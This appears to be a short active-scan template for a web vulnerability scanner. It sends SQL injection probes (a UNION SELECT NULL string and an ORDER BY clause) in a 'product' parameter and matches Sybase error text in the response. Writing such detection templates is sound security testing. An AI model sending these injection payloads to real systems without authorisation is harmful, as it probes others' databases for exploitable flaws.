id: sqli6-sybase-13
name: 'SQLi sybase probe in product'
severity: high
type: active
tags:
  - sqli
  - injection
  - sybase
description: 'Triggers sybase error via product'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      product:
        - ''' UNION SELECT NULL,NULL,NULL--'
        - '1'' ORDER BY 1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Sybase'
          - 'Adaptive Server'
